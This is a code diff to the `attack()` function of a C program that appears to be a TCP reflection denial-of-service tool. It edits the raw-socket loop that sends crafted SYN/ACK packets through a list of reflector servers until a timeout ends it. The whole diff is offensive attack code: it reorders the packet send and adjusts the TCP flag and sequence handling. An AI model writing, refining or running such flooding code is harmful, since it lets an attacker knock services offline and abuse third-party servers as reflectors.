@@ -325,10 +325,6 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
 
     while (true)
     {
-        // Send the packet.
-        sendto(rawsock, datagram, sizeof(struct ip) + sizeof(struct tcphdr), 0, (struct sockaddr*)&sin, sizeof(sin));
-        packets++, pktsent++, z++;
-
         // Check for timeout.
         if (time(NULL) - start >= ttime)
             handle_exit();
@@ -336,6 +332,9 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
         // Reset reflector list if necessary.
         if (z >= server_count)
             z = 1, pktsent = 0;
+
+        // Send the packet.
+        sendto(rawsock, datagram, sizeof(struct ip) + sizeof(struct tcphdr), 0, (struct sockaddr*)&sin, sizeof(sin)), packets++, pktsent++, z++;
 
         // Set TCP options accordingly based on what kind of reflection attack we're doing.
         // pkt 1: ack=0 seq=rand
@@ -362,8 +361,6 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
                 {
                     xf_tcphdr->th_flags = 2;
                     xf_tcphdr->th_seq = htonl(rand_cmwc());
-                    xf_tcphdr->th_ack = htonl(0);
-                    break;
                 }
                 else if (pktsent == 1)
                 {
@@ -371,8 +368,8 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
                     xf_tcphdr->th_flags = 16;
                     xf_tcphdr->th_seq = htonl(xf_tcphdr->th_seq + 1);
                     xf_tcphdr->th_ack = htonl(rand_cmwc());
-                    break;
                 }
+                break;
             }
         }
 
